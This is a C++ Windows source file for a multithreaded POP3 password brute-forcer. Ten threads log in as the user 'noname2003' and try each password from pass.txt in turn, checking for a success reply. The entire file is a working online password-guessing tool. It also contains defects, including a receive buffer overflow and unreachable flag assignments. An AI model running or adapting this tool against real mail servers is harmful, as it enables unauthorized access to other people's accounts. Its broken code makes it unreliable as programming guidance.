#include <process.h>
#include <winsock.h>
#include <iostream.h>
#include <fstream.h>

#define T_NUM 10

bool stop;
int thread_id[T_NUM];
int current_task;
int index[T_NUM];
SOCKET connection[T_NUM];
const char server[]="localhost";
const int port=9110;
const char user_id[]="noname2003";
//char password[80];
unsigned long server_ip;
sockaddr_in server_addr;
hostent *hostinfo;
ifstream file;

bool create_connection(int);
bool recv_and_noerr(int,char *);
bool interact(int,char *,char *,bool *);
bool send_to(int,char *);

void thread(void *arg)
{
	char data[5000];
	bool flag=false;
	char next;
	char password[80];
	int num=*((int *)arg);
	memset(password,0,sizeof(password));
	if (!create_connection(num))
	{
		_endthread();
		cout<<"Thread number "<<num<<" finished"<<endl;
		flag=true;
	}
	while (!stop&&!flag)
	{
		next=file.peek();
		if (next!=-1)
			if (!recv_and_noerr(num,data))
			{
				_endthread();
				cout<<"Thread number "<<num<<" finished"<<endl;
				flag=true;
			}
			else
			{
				file>>password;
				current_task++;
				if (!interact(num,password,data,&flag)&&flag)
				{
					_endthread();
					cout<<"Thread number "<<num<<" finished"<<endl;
				}
			}
		else
			flag=true;
		
	}
//	_endthread();
	cout<<"Thread number "<<num<<" finished"<<endl;
}

void init_threads(void)
{
	for (int i=0; i<T_NUM; i++)
	{
		index[i]=i;
		thread_id[i]=_beginthread(thread,0,(void *)&index[i]);
		//current_task++;
	}
}



bool create_connection(int num)
{
	if ((connection[num]=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
	{
		cerr<<"Socket creation number "<<num
			<<"filed !!! (Code error :"<<WSAGetLastError()<<")"<<endl;
		return false;
	}
	if (connect(connection[num],(sockaddr*)&server_addr,sizeof(sockaddr))==INVALID_SOCKET)
	{
		cout<<"Connection number "<<num<<" error (Code :"<<WSAGetLastError()<<")"<<endl;
		return false;
	}
	cout<<"Thread number "<<num<<" connected ... "<<endl;
	return true;
}

void init_sockets(void)
{
	WSADATA wsaData;
	WORD wVersionRequested=MAKEWORD(2,2);
	in_addr hostaddr;
	if (WSAStartup(wVersionRequested, &wsaData) != 0)
	{
		cerr<<"WSAStartup failed.\n";
		exit(0);
	}

	cout<<"WINSock Initalisation ... "<<endl;
	cout<<"Current version request: "
		<<char(LOBYTE(wVersionRequested)+0x30)
		<<"."<<char(HIBYTE(wVersionRequested)+0x30)<<endl;
	
	cout<<"Highest version support: "
		<<char(LOBYTE(wsaData.wHighVersion)+0x30)
		<<"."<<char(HIBYTE(wsaData.wHighVersion)+0x30)<<endl;

	cout<<endl;

	cout<<"Look up for POP3 server "<<server<<"...."<<endl;
	if ((hostinfo=gethostbyname(server))==NULL)
	{ 
		cout<<"Cannot resolve host !!! (Code :"<<WSAGetLastError()<<")"<<endl; 
		exit(0);
	}

	memcpy(&hostaddr.S_un.S_addr,hostinfo->h_addr_list[0],sizeof(hostinfo->h_addr_list[0]));
	cout<<inet_ntoa(hostaddr)<<endl;
	server_addr.sin_family=AF_INET;
	server_addr.sin_port=htons(port);
	server_addr.sin_addr=*((in_addr *)hostinfo->h_addr);
	memset(server_addr.sin_zero,0,8);
}

bool interact(int num,char *pass,char *data_ptr,bool *flag)
{
	strcpy(data_ptr,"USER "); 
	strcat(data_ptr,user_id);  
	strcat(data_ptr,"\xD\xA\x0");
	if (!send_to(num,data_ptr))
	{
		return false;
		*flag=true;
	}
	cout<<"Sending USER "<<user_id<<endl;
	if (!recv_and_noerr(num,data_ptr))
		return false;
	strcpy(data_ptr,"PASS ");	
	strcat(data_ptr,pass);
	strcat(data_ptr,"\xD\xA\x0");
	if (!send_to(num,data_ptr))
	{
		return false;
		*flag=true;
	}
	cout<<"Sending PASS "<<pass<<endl;
	if (recv_and_noerr(num,data_ptr))
		*flag=true;
	return true;
}

bool is_error(char *data_ptr)   
{ 
	for (int i=0; i<strlen(data_ptr); i++)
		if (data_ptr[i]=='+')
			return false;
	return true;
}

bool send_to(int num,char *data_ptr)
{
    if (send(connection[num],data_ptr,strlen(data_ptr),0)==SOCKET_ERROR)
	{
		cout<<"Sending number "<<num<<" filed (Code : "<<WSAGetLastError()<<")"<<endl;
		return false;
	}
	return true;
}

bool recv_and_noerr(int num,char *data_ptr)
{
	int len;
	if ((len=(recv(connection[num],data_ptr,5490,0)))==SOCKET_ERROR)
	{
		cout<<"Reciving number "<<num<<" filed (Code :"<<WSAGetLastError()<<")"<<endl;
		return false;
	}
	
	data_ptr[len]='\x0';
	cout<<data_ptr<<endl;
	return is_error(data_ptr);
}

void waiting(void)
{
	int status;
	for (int i=0; i<T_NUM; i++)
		_cwait(&status,thread_id[i],0);
	for (i=0; i<T_NUM; i++)
		closesocket(connection[i]);
}

void main(int argn, char **argv)
{
	init_sockets();
	init_threads();
	file.open("pass.txt",ios::in);
	if (file==NULL)
	{
		cerr<<"Error opening file"<<endl;
		exit(0);
	}

	waiting();
	WSACleanup();
}